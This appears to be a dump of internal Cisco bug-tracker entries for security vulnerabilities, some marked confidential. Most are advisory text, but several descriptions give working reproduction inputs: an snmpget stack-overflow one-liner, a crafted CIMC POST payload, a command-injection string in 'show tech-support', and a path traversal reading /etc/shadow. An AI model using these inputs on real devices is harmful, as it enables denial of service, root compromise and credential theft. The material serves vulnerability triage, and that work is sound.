RNE: Symptom: A vulnerability in the implementation of Network Address Translation (NAT) functionality in Cisco IOS Software could allow an unauthenticated, remote attacker to cause a denial of service (DoS) condition on an affected device.  The vulnerability is due to the improper translation of H.323 messages that use the Registration, Admission, and Status (RAS) protocol and are sent to an affected device via IPv4 packets. An attacker could exploit this vulnerability by sending a crafted H.323 RAS packet through an affected device. A successful exploit could allow the attacker to cause the affected device to crash and reload, resulting in a DoS condition.  Cisco has released software updates that address this vulnerability. There is a workaround that addresses this vulnerability.  This advisory is available at the following link: https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20170927-nat  This advisory is part of the September 27, 2017, release of the Cisco IOS and IOS XE Software Security Advisory Bundled Publication, which includes 12 Cisco Security Advisories that describe 13 vulnerabilities. For a complete list of the advisories and links to them, see the " Cisco Event Response: September 2017 Semiannual Cisco IOS and IOS XE Software Security Advisory Bundled Publication" which is available at http://tools.cisco.com/security/center/viewErp.x?alertId=ERP-63410  Conditions: This vulnerability affects Cisco devices that are running a vulnerable release of a Cisco IOS. See the published advisory for more information.  Please see the Cisco IOS and Cisco IOS XE Software Checker tool for information on non-vulnerable, vulnerable and fixed releases. This tool is available at http://tools.cisco.com/security/center/selectIOSVersion.x  Workaround: See published advisory  Further Problem Description: PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 3 score. The Base CVSS score as of the time of evaluation is 8.6:  https://tools.cisco.com/security/center/cvssCalculator.x?version=3.0&vector=CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:N/A:H/E:X/RL:X/RC:X  CVE ID CVE-2017-12231 has been assigned to document this issue.  Additional information on Cisco's security vulnerability policy can be found at the following URL:  http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html
Description: Cisco 2921 configured to perform NAT. Send packet through device, UDP, destination port 1718/UDP. Device crashes.Disable RAS NAT by entering ;no ip nat service ras; command on global config. Send packet again. No crash.Show tech, crashinfo and offending packet attached to bug.

Description: Python contains a vulnerability in the CGIHTTPServer module when handling crafted HTTP requests that could allow attackers to gain access to potentially sensitive information (e.g. source code). Need a confirmation whether ESA or SMA is not impacted due to this vulnerability. Note:This audit may report a finding on versions containing an source code patch. As such, it may be necessary to manually verify the applicability by using the guidance in the referenced Python Issue #2254. This check requires administrative access to the target: false. PSIRT: PSIRT-owner: trfridle           This issue is being considered for possible inclusion in a Security Advisory even though the Release-note Enclosure is already visible to customers.  Please do not further change the Release-note Enclosure;  PSIRT will modify it appropriately at a later date.          Do not provide customers with any information beyond what is currently contained in the Release-note Enclosure.          Should customers appear to be running into this DDTs within their network,  please bring it to the immediate attention of the Cisco PSIRT  at psirt@cisco.com.  This issue is a violation of Cisco's Product Security Baseline Requirements which are documented  at the following link:  <http://wwwin- eng.cisco.com/Eng/TechOps/Arch_Baselines/Baseline_Requirement_Documents/product- security-baseline.doc>  The appropriate section is:  SEC-REM-FEAT    Disabling unneeded platform features and Services  Condition: This requirement is MANDATORY for all Products that ship bundled with supporting  software.  Requirement: If a Product is shipped bundled with supporting software, such as an operating  system,  database manager, or HTTP server, any features or Services of the supporting software which is  non-essential for operation of the Product MUST be removed or disabled.  Status: Current  Justification: Unnecessary services may have dangerous security holes.  Such holes are  especially  insidious because administrators may not realize that unused services are enabled at all.  Document References:  Implementation Guidelines:  The complete removal of the software implementing any nonessential  and  unsupported services has the advantage that if a miscreant gains access to the system they  would first have to install the software in order to activate the service on the compromised system.

Title: MSE: CVE-2015-0204 observed on TCP Port 1621
RNE: Symptoms: Running a port scan on an MSE shows that it is vulnerable to CVE-2015-0204 on port 1621. Packet capture of the port scan shows the MSE responding using to the client utilizing an insecure EXPORT  cipher (e.g., TLS_RSA_EXPORT_WITH_DES40_CBC_SHA).  Conditions: MSE running 8.0.140.9  Workaround: Use firewall to block external communication to the MSE on port TCP Port 1621  Further Problem Description: None.  PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 3 score. Title: able to bring down CIMC network interface sending crafted web request
RNE: Symptoms: Cisco Integrated Management Controller contains a vulnerability that could allow an authenticated, remote attacker to cause the CIMC IP interface to  be not accessible.  Conditions:  The vulnerability is due to incomplete input sanitization of certain parameters.  An attacker could exploit this vulnerability by sending a crafted HTTP  request to the CIMC. An exploit could allow the attacker to cause the CIMC to be inaccessible via the IP interface.  Access via serial interface is still possible.  Fix will be available in 2.0(9).  Workaround:  Perform a factory reset.  Further Problem Description: PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 2 score. Description: Version:Cisco Integrated Management ControllerVersion: 2.0(1b)?2008-2014, Cisco Systems, Inc. All rights reserved.C220M3.2.0.1b.0 (Build Date: 05/26/2014)Description:An authenticated user can bring down the CIMC network interface by sending a crafted web request to the CIMC web ui.Also, systems changes can be made that are not specifically being allowed by the web UI.Example - the hostname can be changed using. The web UI does not permit such ;noticed; functionality:POST /data?set=hostname%3AerinExample - following request will crash the CIMC:POST /data?set=hostname%3As%27%3E%5C%22%3E%3Cimg%20src%5C%3Dx%20onerror%5C%3Dalert%5C(0%5C)%3E%60endNOTE: rebooting or unplugging the power from the server does NOT resolve the issue. CIMC interface remain downNOTE: this poses a possible security riskNOTE: this was tested using a Device name and an IP. Both crashed. Unable to ping IP of CIMC after it crashes.Steps:Configure device for CIMC/LOMStart Burp SuiteLog into CIMCNavigate to Server tab[note Hostname value]Set Description as:testStart proxy interceptSave ChangesIn proxy, change from:/data?set=description%3AtestTo:/data?set=hostname%3AtestRelease proxy intercept[wait for page to load; host name is changed]Set Description as:test-againStart proxy interceptSave ChangesIn proxy, change from:/data?set=description%3Atest-againTo:/data?set=hostname%3As%27%3E%5C%22%3E%3Cimg%20src%5C%3Dx%20onerror%5C%3Dalert%5C(0%5C)%3E%60endRelease proxy intercept[wait; CIMC crashes]Actual Results:- Able to change the hostname through a web request- Able to crash the CIMC with a crafted web requestExpected Result:1) would be unable to change the hostname through a web request because there is no input box accepting a value2) would be unable to crash the CIMC with a crafted web request
PSIRT: PSIRT-owner: trfridle           This issue is being considered for possible inclusion in a Security Advisory even though the Release-note Enclosure is already visible to customers.  Please do not further change the Release-note Enclosure;  PSIRT will modify it appropriately at a later date.          Do not provide customers with any information beyond what is currently contained in the Release-note Enclosure.          Should customers appear to be running into this DDTs within their network,  please bring it to the immediate attention of the Cisco PSIRT  at psirt@cisco.com.  This issue is a violation of Cisco's Product Security Baseline Requirements which are documented  at the following link:  <http://wwwin- eng.cisco.com/Eng/TechOps/Arch_Baselines/Baseline_Requirement_Documents/product- security-baseline.doc>  The appropriate section is:  SEC-REM-FEAT    Disabling unneeded platform features and Services  Condition: This requirement is MANDATORY for all Products that ship bundled with supporting  software.  Requirement: If a Product is shipped bundled with supporting software, such as an operating  system,  database manager, or HTTP server, any features or Services of the supporting software which is  non-essential for operation of the Product MUST be removed or disabled.  Status: Current  Justification: Unnecessary services may have dangerous security holes.  Such holes are  especially  insidious because administrators may not realize that unused services are enabled at all.  Document References:  Implementation Guidelines:  The complete removal of the software implementing any nonessential  and  unsupported services has the advantage that if a miscreant gains access to the system they  would first have to install the software in order to activate the service on the compromised system.

Title: ASA is not correctly handling errors on AES-GCM ICV
RNE: Symptom: A vulnerability in the AES-GCM code of Cisco Adaptive Security Appliance (ASA) could allow an unauthenticated, remote attacker to modify the contents of an encrypted IPSec or IKEv2 packet, and for those modifications not to be detected.  The vulnerability is due to an error on the firmware of the Cavium Networks cryptographic module. Due to this vulnerability, the ICV is not checked. An attacker could exploit this vulnerability by intercepting encrypted packets in transit and modifying their contents. Such packets would be decrypted by the ASA and then forwarded to their destination, without the modification being detected.  Please note that this vulnerability does NOT allow an attacker to decrypt the packets in transit, nor obtain information about the session keys being used for the security association.  This vulnerability does NOT impact SSL/TLS traffic originated or destined to the ASA.  Conditions: An IKEv2 or an IPSec policy using any of the following algorithms for data encryption: aes-gcm, aes-gcm-192, aes-gcm-256.   This vulnerability only applies to the following ASA models: ASA5506-X (all hardware models), ASA5508-X, and ASA5516-X.  Workaround: There is no workaround for customers whose security policy requires the use of AES-GCM.  For customers that can use an alternative encryption algorith, IKE or IPSec policies using AES-GCM could be changed to use instead AES.  Further Problem Description: PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 2 score. The Base and Temporal CVSS scores as of the time of evaluation are 4.3/3.6:  http://tools.cisco.com/security/center/cvssCalculator.x?vector=AV:N/AC:M/Au:N/C:N/I:P/A:N/E:F/RL:OF/RC:C&version=2.0  CVE ID CVE-2015-4550 has been assigned to document this issue.  Additional information on Cisco's security vulnerability policy can be found at the following URL: http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html
Description: The ASA5506 platform's hardware crypto subsystem is not correctly handling AES-GCM ICV failures.

Title: IOSd crash triggered by certain CDP packet
RNE: Symptom: Cat4K running IOS-XE will crash with following message  by receiving a specific but valid CDP packet.  IOSd crash: Segmentation fault(11), Process = CDP Protocol   Conditions: - Cat4K Sup7/7L-E or Sup8-E or 4500-X - IOS-XE 3.6.0E or later version is running - Device has CDP enabled. - pnp configuration is not enabled.   Workaround: 1) configure 'no cdp tlv app' or 'no cdp enable' on physical ports 2) downgrade to IOS-XE 3.5.3E or ealier version   More Info:  PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 2 score. The Base and Temporal CVSS scores as of the time of evaluation are  6.1/5: http://tools.cisco.com/security/center/cvssCalculator.x?vector=AV:A/AC:L/Au:N/C:N/I:N/A:C/E:F/RL:OF/RC:C&version=2.0  CVE ID CVE-2015-6294 has been assigned to this issue. Additional information on Cisco's security vulnerability policy can be found at the following URL: http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html

(mcassini-09/29/17) Symptoms: Cisco IronPort Email Security Appliance (ESA) includes a version of Advanced Malware Protection (AMP) that is affected by a vulnerability that could allow an unauthenticated, remote attacker to bypass the AMP scan for files inside rar or 7zip archives.  The vulnerability is due to improper validation of the archive file content. An attacker could exploit this by sending a RAR or 7z file containing specially crafted files as email attachment through the affected ESA device.  Conditions: ESA device with Advanced Malware Protection Settings configured to deliver Unscannable Attachments (default configuration).  Workaround: None. Where possible, the action applied to Unscannable Attachments in the Advanced Malware Protection Settings could be set to Drop Message or Quarantine, in order to avoid emails containing files that could not be scanned by AMP to be delivered by the ESA.  Further Problem Description:  PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 3 score. The Base CVSS score as of the time of evaluation is 5.8: https://tools.cisco.com/security/center/cvssCalculator.x?version=3.0&vector=CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:L/A:N/E:X/RL:X/RC:X  No CVE ID has been assigned to this issue. Title: Cisco IP Phone 8851 Session Initiation Protocol Denial of Service Vulnerability
RNE: $$IGNORE  Symptom: A vulnerability in the Session Initiation Protocol (SIP) implementation of the Cisco 8851 phone could allow an unauthenticated, remote attacker to cause a denial of service (DoS) condition. An exploit could allow the attacker to cause a disruption of service to the phone.  Conditions: Applies to phone load sip88xx.11-0-0MP2-50dev.loads.  Workaround: None. Title: Cisco CAT6K Malformed LISP Packet Vulnerability
RNE: $$IGNORE-PSIRT  CISCO HIGHLY CONFIDENTIAL - CONTROLLED ACCESS  This issue is under review by the Cisco Product Security Incident Response team (PSIRT).  The defect describes a product security vulnerability.  Its contents must be protected from unauthorized disclosure, both internal and external to Cisco.  Do not forward this information to mailing lists or newsgroups.  Documentation writers: it is prohibited to publish this Release-note  Enclosure (RNE) until the content has been approved by PSIRT.  PSIRT may  publish a Security Advisory regarding this defect, and the current text of  this RNE will be replaced with appropriate information.  In the event that  a Security Advisory is not published, PSIRT will replace this text with an  appropriate explanation.  More information on PSIRT is available at http//psirt.cisco.com/.   Cisco's public policy on security vulnerability handling can be reviewed at  http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html. For further information, send a message to psirt@cisco.com.  (tfinn-06/03/15) Symptoms: A vulnerability in the Application Specific Integrated Circuit (ASIC) interface with the Locator/ID Separation Protocol (LISP) configured of the Cisco Catalyst 6000 Series Switches  (CAT6K) could allow an unauthenticated, remote attacker to cause a reload of the device due to a denial of service (DoS) attack using a crafted malformed LISP packet.  The vulnerability is due to an error in the handling of the malformed LISP packet. An attacker could exploit this vulnerability by sending a crafted LISP packet to the CAT6K. An  exploit could allow the attacker to take the CAT6K offline via a DoS attack. A sustained Dos attack could make the (CAT6K) unavailable.  Conditions: The LISP feature is enabled and configured on an interface.   Workaround: None.  Further Problem Description: The system will reload with the reset reason of ''EARL Recovery Patch errors''.
Description: System crashes on sending LISP malformed packet#### Topology ####Ixia ----- PITR### Steps to reproduce ####1) Send the LISP malformed packet capture to the PITR. The packet has a malformed LISP header and malformed inner IP header2) System has resets with EARL Recovery Patch errors.3) Issue happens when the frame length is <= 70 bytes i,e12(L2)+2(ethtype)+20(OH)+8(UDP ;port 4341)+24(payload)+4(CRC)4)So if the payload i.e the UDP payload <= 24 bytes crash is observed.#### Reproducibility ########Always#### Workaround ####None#### Recovery Steps #####None#### Customer Impact ###Crash

Title: Malicious Redirect in Login Page
RNE: Symptoms: Cisco TelePresence Collaboration Desk and Room Endpoints running TC software contain an HTML redirect vulnerability within the login page of the web user interface.  An  unauthenticated, remote attacker that can convince a user to follow a malicious link or visit an attacker controlled site could cause a users browser to be automatically redirected to  an attacker controlled site.  The vulnerability is due to improper input validation of certain parameters that are passed via URL?s to an affected device.  A successful attack could allow an attacker to steal  potentially sensitive information by impersonating the legitimate device.  Conditions: Devices running TC Software prior to version 6.3-26 and prior to 7.3.0 are affected.  Workaround: None available.  Further Problem Description:  PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 2 score. The Base and Temporal CVSS scores as of the time of evaluation are 4.3/3.6: http://tools.cisco.com/security/center/cvssCalculator.x?vector=AV:N/AC:M/Au:N/C:N/I:P/A:N/E:F/RL:OF/RC:C&version=2.0  CVE ID CVE-2015-0697 has been assigned to document this issue. Title: Cisco ASA GTP Inspection Engine Denial of Service Vulnerability
RNE: Symptom: Cisco Adaptive Security Appliance (ASA) Software is affected by the following vulnerabilities:      Cisco ASA SQL*NET Inspection Engine Denial of Service Vulnerability     Cisco ASA VPN Denial of Service Vulnerability     Cisco ASA IKEv2 Denial of Service Vulnerability     Cisco ASA High Performance Monitor Denial of Service Vulnerability     Cisco ASA GPRS Tunneling Protocol Inspection Engine Denial of Service Vulnerability     Cisco ASA SunRPC Inspection Engine Denial of Service Vulnerability     Cisco ASA DNS Inspection Engine Denial of Service Vulnerability     Cisco ASA VPN Failover Command Injection Vulnerability     Cisco ASA VNMC Command Input Validation Vulnerability     Cisco ASA Local Path Inclusion Vulnerability     Cisco ASA Clientless SSL VPN Information Disclosure and Denial of Service Vulnerability     Cisco ASA Clientless SSL VPN Portal Customization Integrity Vulnerability     Cisco ASA Smart Call Home Digital Certificate Validation Vulnerability  These vulnerabilities are independent of one another; a release that is affected by one of the vulnerabilities may not be affected by the others.  Successful exploitation of the Cisco ASA SQL*NET Inspection Engine Denial of Service Vulnerability, Cisco ASA VPN Denial of Service Vulnerability, Cisco ASA IKEv2 Denial of Service Vulnerability, Cisco ASA High Performance Monitor Denial of Service Vulnerability, Cisco ASA GPRS Tunneling Protocol Inspection Engine Denial of Service Vulnerability, Cisco ASA SunRPC Inspection Engine Denial of Service Vulnerability, and Cisco ASA DNS Inspection Engine Denial of Service Vulnerability may result in a reload of an affected device, leading to a denial of service (DoS) condition.  Successful exploitation of the Cisco ASA VPN Failover Command Injection Vulnerability, Cisco ASA VNMC Command Input Validation Vulnerability, and Cisco ASA Local Path Inclusion Vulnerability may result in full compromise of the affected system.  Successful exploitation of the Cisco ASA Clientless SSL VPN Information Disclosure and Denial of Service Vulnerability may result in the disclosure of internal information or, in some cases, a reload of the affected system.  Successful exploitation of the Cisco ASA Clientless SSL VPN Portal Customization Integrity Vulnerability may result in a compromise of the Clientless SSL VPN portal, which may lead to several types of attacks, which are not limited to cross-site scripting (XSS), stealing of credentials, or redirects of users to malicious web pages.  Successful exploitation of the Cisco ASA Smart Call Home Digital Certificate Validation Vulnerability may result in a digital certificate validation bypass, which could allow the attacker to bypass digital certificate authentication and gain access inside the network via remote access VPN or management access to the affected system via the Cisco Adaptive Security Device Management (ASDM).  Cisco has released free software updates that address these vulnerabilities. Workarounds that mitigate some of these vulnerabilities are available.  This advisory is available at the following link: http://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20141008-asa  Conditions: See published Cisco Security Advisory  Workaround: See published Cisco Security Advisory  PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 2 score. Title: Crash in ADSL DMT SNMP code
RNE: Symptom: The Simple Network Management Protocol (SNMP) subsystem of Cisco IOS and IOS XE Software contains multiple vulnerabilities that could allow an authenticated, remote attacker to remotely execute code on an affected system or cause an affected system to reload. An attacker could exploit these vulnerabilities by sending a crafted SNMP packet to an affected system via IPv4 or IPv6. Only traffic directed to an affected system can be used to exploit these vulnerabilities.  The vulnerabilities are due to a buffer overflow condition in the SNMP subsystem of the affected software. The vulnerabilities affect all versions of SNMP Versions 1, 2c, and 3. To exploit these vulnerabilities via SNMP Version 2c or earlier, the attacker must know the SNMP read-only community string for the affected system. To exploit these vulnerabilities via SNMP Version 3, the attacker must have user credentials for the affected system. A successful exploit could allow the attacker to execute arbitrary code and obtain full control of the affected system or cause the affected system to reload.  Cisco will release software updates that address these vulnerabilities. There are workarounds that address these vulnerabilities.  The advisory is available at the following link: https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20170629-snmp  Conditions: Devices running an affected version of Cisco IOS Software or Cisco IOS XE Software.  Workaround: Administrators are advised to allow only trusted users to have SNMP access on an affected system. Administrators are also advised to monitor affected systems by using the show snmp host command in the CLI.  In addition, administrators can mitigate these vulnerabilities by disabling the following MIBs on a device:      ADSL-LINE-MIB     ALPS-MIB     CISCO-ADSL-DMT-LINE-MIB     CISCO-BSTUN-MIB     CISCO-MAC-AUTH-BYPASS-MIB     CISCO-SLB-EXT-MIB     CISCO-VOICE-DNIS-MIB     CISCO-VOICE-NUMBER-EXPANSION-MIB     TN3270E-RT-MIB  To create or update a view entry and disable the affected MIBs, administrators can use the snmp-server view global configuration command, as shown in the following example:      snmp-server view NO_BAD_SNMP iso included     snmp-server view NO_BAD_SNMP internet included     snmp-server view NO_BAD_SNMP snmpUsmMIB excluded     snmp-server view NO_BAD_SNMP snmpVacmMIB excluded     snmp-server view NO_BAD_SNMP snmpCommunityMIB excluded     snmp-server view NO_BAD_SNMP ciscoMgmt.252 excluded     snmp-server view NO_BAD_SNMP transmission.94 excluded     snmp-server view NO_BAD_SNMP mib-2.34.9 excluded     snmp-server view NO_BAD_SNMP ciscoMgmt.35 excluded     snmp-server view NO_BAD_SNMP ciscoMgmt.95 excluded     snmp-server view NO_BAD_SNMP ciscoMgmt.130 excluded     snmp-server view NO_BAD_SNMP ciscoMgmt.219 excluded     snmp-server view NO_BAD_SNMP ciscoMgmt.254 excluded     snmp-server view NO_BAD_SNMP ciscoMabMIB excluded     snmp-server view NO_BAD_SNMP ciscoExperiment.997 excluded  To then apply this configuration to a community string, administrators can use the following command:       snmp-server community mycomm view NO_BAD_SNMP RO  For SNMP Version 3, administrators can use the following command:       snmp-server group v3group auth read NO_BAD_SNMP write NO_BAD_SNMP  Further Problem Description: Customer are advised to utilize the Cisco IOS Software Checker or Contact Cisco TAC to determine if fixed software has been released for an affected platform.  Cisco IOS Software Checker: http://tools.cisco.com/security/center/selectIOSVersion.x   PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 3 score. The Base CVSS score as of the time of evaluation is 8.8: https://tools.cisco.com/security/center/cvssCalculator.x?version=3.0&vector=CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H/E:X/RL:X/RC:X  CVE ID CVE-2017-6743 has been assigned to document this issue.  Additional information on Cisco's security vulnerability policy can be found at the following URL: http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html
Description: It is possible to reliably crash a router by sending it a single packet. This sender only needs to know the snmp community read string. The crash can be triggered by issuing the following command on any system that supports the snmpget program:snmpget -v2c -c <read-pwd> <address> `python -c ;print '1.3.6.1.4.1.9.9.130.1.14.1.1%s'%('.1'*100);`The crash is caused by a overflowing a stack variable, potentially allowing an attacker to gain control of the cpu program counter. I have recreated the crash as far back as 15.0(1)M, although checking the source shows that this problem originated at least as far back as 12.2.  This crash does not require any configuration of ADSL DMT, the feature need only be present in the image.The crash occurs because the function k_cAdslDmtLineConfProfileEntry_get() in sr_adsldmtmib.c creates a 33 byte buffer on the stack, and then blindly copies however many bytes are specified in the incoming request. This also occurs another five places in that file. All of these callers to memset must validate that the length specified in the OID is less than the length of the destination buffer before doing the copy.

The device is configured for Overlay Transport Virtualization (OTV), where the physical interface of the connection is over the M1-Series module.   Workaround:  None. Title: SSH segfaults with error 4 in libpam_aaa_auth.so
RNE: $$IGNORE-PSIRT  CISCO HIGHLY CONFIDENTIAL - CONTROLLED ACCESS  This issue is under review by the Cisco Product Security Incident Response team (PSIRT).  The defect describes a product security vulnerability.  Its contents must be protected from unauthorized disclosure, both internal and external to Cisco.  Do not forward this information to mailing lists or newsgroups.  Documentation writers: it is prohibited to publish this Release-note  Enclosure (RNE) until the content has been approved by PSIRT.  PSIRT may  publish a Security Advisory regarding this defect, and the current text of  this RNE will be replaced with appropriate information.  In the event that  a Security Advisory is not published, PSIRT will replace this text with an  appropriate explanation.  More information on PSIRT is available at http//psirt.cisco.com/.   Cisco's public policy on security vulnerability handling can be reviewed at  http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html. For further information, send a message to psirt@cisco.com.  (dciccaro-01/31/17)
Description: Under SSH bruteforcing attack, MTS recv queues for SAP 112 (tacacs daemon) and SAP 111 (aaa daemon) became extensively filled (over 40,000 messages), and so these services became unresponsive. Likely as a result, the SSH service started crashing and segfaulting:[22063429.689037] dcos_sshd[24032]: segfault at 4 ip 00000000e393e347 sp 00000000ff9e5b70 error 4 in libpam_aaa_auth.so[e393b000+9000][22063440.699168] dcos_sshd[24123]: segfault at 4 ip 00000000e391f347 sp 00000000ff8e7af0 error 4 in libpam_aaa_auth.so[e391c000+9000][22063453.260350] dcos_sshd[24149]: segfault at 4 ip 00000000e38d8347 sp 00000000ffd12580 error 4 in libpam_aaa_auth.so[e38d5000+9000]It was not possible to access the switch using valid credentials, either TACACS-based or local - after logging in, the SSH connection stalled and was abruptly terminated by the switch before the CLI interpreter was even started.The only solution was to access the switch via console, manually flush the MTS recv queues for SAP 111 and 112, then disable and reenable ;feature tacacs+;.

Title: Cisco Email Security Appliance OpenSSH Vulnerability
RNE: Symptom: Cisco Email Security Appliance (ESA) and Web Security Appliance (WSA) includes a version  of the Open Secure Host (OpenSSH) Protocol that is affected by the vulnerabilities identified  by the following Common Vulnerability and Exposures (CVE) IDs:   CVE-2016-6210, CVE-2016-6515  This bug was opened to address the potential impact on this product.  Conditions: Device with default configuration.  Workaround: to apply  openssh third party patch about corresponding CVEs  Further Problem Description: Additional details about the vulnerabilities listed above can be found at http://cve.mitre.org/cve/cve.html.  PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 3 score. The Base CVSS score as of the time of evaluation is 7.5: https://tools.cisco.com/security/center/cvssCalculator.x?version=3.0&vector=CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:X/RL:X/RC:X  CVE ID CVE-2016-6210, CVE-2016-6515 has been assigned to document this issue.  Additional information on Cisco's security vulnerability policy can be found at the following URL: http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html
Description: There are 4 vulnerabilities for hosts running OpenSSH versions 7.2 and earlier.Currently the latest version of OpenSSH installed on the ESA latest code has only OpenSSH 6.2_hpn13v11 installed, making the ESA vulnerable.Vulnerabilities listed here - https://vulners.com/nessus/OPENSSH_73.NASL CVE-2016-6210- A flaw exists that is due to the program returning shorter response times for authentication requests with overly long passwords for invalid users than for valid users. This may allow a remote attacker to conduct a timing attack and enumerate valid usernamesCVE-2016-6515- A denial of service vulnerability exists in the auth_password() function in auth-passwd.c due to a failure to limit password lengths for password authentication. An unauthenticated, remote attacker can exploit this, via a long string, to consume excessive CPU resources, resulting in a denial of service conditionVulnDB 142343- An unspecified flaw exists in the CBC padding oracle countermeasures that allows an unauthenticated, remote attacker to conduct a timing attack. VulnDB 142344- A flaw exists due to improper operation ordering of MAC verification for Encrypt-then-MAC (EtM) mode transport MAC algorithms when verifying the MAC before decrypting any ciphertext. An unauthenticated, remote attacker can exploit this, via a timing attack, to disclose sensitive information.

Title: Cisco NX-OS Software Malformed DHCPv4 Packet Denial of Service Vulnerability
RNE: Symptoms: A vulnerability in the implementation of the DHCPv4 relay agent in Cisco NX-OS Software could allow an unauthenticated, remote attacker to cause a denial of  service (DoS) condition on an affected device.  The vulnerability is due to improper validation of malformed DHCPv4 packets. An attacker could exploit this vulnerability by sending malformed DHCPv4 packets to  an affected device. An exploit could allow the attacker to cause the DHCP process or device to crash.  This vulnerability can be exploited using IPv4 packets only. The vulnerability can be triggered by malformed DHCP packets processed by a DHCP relay agent  listening on the device, using the IPv4 broadcast address or IPv4 unicast address of any interface configured on a device.  Cisco has released software updates that address this vulnerability. There are no workarounds that address this vulnerability.   This advisory is available at the following link: http://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20161005-dhcp2  Conditions: See Advisory  Workaround: See Advisory  Further Problem Description:  PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 2 score. The Base and Temporal CVSS scores as of the time of evaluation are 7.8/6.4: http://tools.cisco.com/security/center/cvssCalculator.x?vector=AV:N/AC:L/Au:N/C:N/I:N/A:C/E:F/RL:OF/RC:C&version=2.0  CVE ID CVE-2015-6393 has been assigned to document this issue.  Additional information on Cisco's security vulnerability policy can be found at the following URL: http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html

Title: Command injection vulnerability in Cisco IOS-XR
RNE: Symptom: A vulnerability in the CLI of Cisco IOS XR Software could allow an authenticated, local attacker to execute arbitrary commands on the host operating system with root privileges.  The vulnerability is due to insufficient input validation. An attacker could exploit this vulnerability by sending crafted input to a command in a specific group. A successful exploit could allow the attacker to execute arbitrary commands on the affected system with root privileges.  There are no workarounds that address this vulnerability.  This advisory is available at the following link: https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20170621-ios  Conditions: This vulnerability affects Cisco IOS XR Software Release 6.0.2.BASE.  Workaround: None  Further Problem Description: PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 3 score. The Base CVSS score as of the time of evaluation is 6.7: https://tools.cisco.com/security/center/cvssCalculator.x?version=3.0&vector=CVSS:3.0/AV:L/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H/E:X/RL:X/RC:X  CVE ID CVE-2017-6719 has been assigned to document this issue.  Additional information on Cisco's security vulnerability policy can be found at the following URL: http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html
Description: Any user who can run the `show tech-support` command (for example, any user with the operator group) may escalate to root in the XR-vm by using a command injection vulnerability present in the `show tech-support` command.  Once a user has root in the XR-vm they can escalate to the highest privilege user everywhere else on the system (XR-cli, sysadmin cli and vm, host).`show tech-support` takes an optional file parameter, which is vulnerable to command injection.  For example:`show tech-support file /misc/scratch/foo;{touch,/foo}`will create the file `/foo`, owned by root.Recommendations:- Do not call out to the shell directly- Perform input sanitization- Review the Defend Against Command Injection recipe (https://cisco.jiveon.com/docs/DOC-1583666)- Audit code for other commands to search for additional command injections.  Since all processes run as root, any command injection is likely to lead to a full compromise of the system.
PSIRT: PSIRT-owner: srasovic           PSIRT is reviewing this issue for possible inclusion in a Cisco Security  Advisory which could include this DDTs.  Please do not change the  Release-note Enclosure, as PSIRT will modify it appropriately when this  issue is made public.          Should customers request information regarding this DDTs or appear to be running into this DDTs within their network, please bring it to the immediate attention of the Cisco PSIRT at psirt@cisco.com.

Title: Cisco TelePresence IX5000 Directory Traversal Vulnerability
RNE: Symptom: A vulnerability in the web framework of the Cisco TelePresence IX5000 Series could allow an unauthenticated, remote attacker to access arbitrary files on an affected device.  The vulnerability is due to insufficient input validation. An attacker could exploit this vulnerability by using directory traversal techniques to read files within the Cisco TelePresence IX5000 Series filesystem.  Cisco has released software updates that address this vulnerability. There are no workarounds that address this vulnerability.  This advisory is available at the following link:  https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20170517-telepresence-ix5000  Conditions: Please refer to the Security Advisory.  Workaround: Please refer to the Security Advisory.  Further Problem Description: Please refer to the Security Advisory.  PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 3 score. The Base CVSS score as of the time of evaluation is 7.5: https://tools.cisco.com/security/center/cvssCalculator.x?version=3.0&vector=CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N/E:X/RL:X/RC:X  CVE ID CVE-2017-6652 has been assigned to document this issue.  Additional information on Cisco's security vulnerability policy can be found at the following URL: http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html
Description: IX5000 webserver affected with Directory Traversal VulnerabilityThe remote web server running on port 6970 was affected by a directory traversal vulnerability.Customer was able to read arbitrary files on the remote host outside of the web server's document by doing request of the form ;GET /../../../file; and file could be ;'etc/passwd', 'etc/shadow'.This vulnerability can be used to read system files with root privieges and to get all passwords.This could be used to conduct further attacks within the environment

Title: RMI Privilege Escalation Vulnerability
